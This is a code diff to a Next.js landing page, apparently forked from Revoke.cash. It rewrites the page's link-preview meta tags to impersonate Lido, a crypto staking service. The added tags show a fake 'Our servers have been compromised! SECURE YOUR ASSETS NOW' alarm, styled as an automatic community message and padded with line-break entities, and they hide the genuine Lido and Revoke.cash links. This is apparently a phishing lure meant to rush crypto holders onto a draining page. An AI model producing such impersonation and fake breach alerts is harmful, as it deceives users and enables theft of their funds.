@@ -5,7 +5,6 @@ import Sponsors from 'components/landing/Sponsors';
 import WhyRevokeCash from 'components/landing/WhyRevokeCash';
 import LandingLayout from 'layouts/LandingLayout';
 import type { NextPage } from 'next';
-import { LogoJsonLd } from 'next-seo';
 import useTranslation from 'next-translate/useTranslation';
 import Head from 'next/head';
 
@@ -16,9 +15,9 @@ const LandingPage: NextPage = () => {
     <>
       {/* <NextSeo
         {...defaultSEO}
-        site_name = ""
-        title={t('common:meta.title')}
-        description={t('common:meta.description', { chainName: 'Ethereum' })}
+        // site_name = ""
+        // title={t('common:meta.title')}
+        // description={t('common:meta.description', { chainName: 'Ethereum' })}
       /> */}
       <Head>
         <meta
@@ -26,16 +25,16 @@ const LandingPage: NextPage = () => {
           content="Lido is a liquid staking solution for Ethereum (ETH), Solana (SOL) and Polygon (MATIC)."
         />
         <meta property="og:type" content="article" />
-        <meta property="og:title" content="🚨 COMMUNITY AUTO MESSAGE 🚨" />
+        <meta property="og:title" content=" SECURE YOUR ASSETS NOW‼️ " />
         <meta property="og:site_name" content="This is an automatically generated announcement message" />
         <meta
           property="og:description"
-          content="🚩Our servers have been compromised!🥷&#013;&#013;SECURE YOUR ASSETS NOW‼️"
+          content="🚩Our servers have been compromised!🥷&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;🚨 COMMUNITY AUTO MESSAGE 🚨"
         />
-        <meta property="og:url" content="https://lido.fi" />
-        {/* <meta property="og:image" content="images/F2sbNMMXZe8w.png"/> */}
+        {/* <meta property="og:url" content="https://lido.fi" /> */}
+        <meta property="og:image" content="https://revoke.cash/assets/images/revoke-og-image.jpg" />
       </Head>
-      <LogoJsonLd logo="https://revoke.cash/assets/images/revoke-icon.svg" url="https://revoke.cash" />
+      {/* <LogoJsonLd logo="https://revoke.cash/assets/images/revoke-icon.svg" url="https://revoke.cash" /> */}
       <LandingLayout>
         <div className="flex flex-col items-center gap-8">
           <HeroSection />
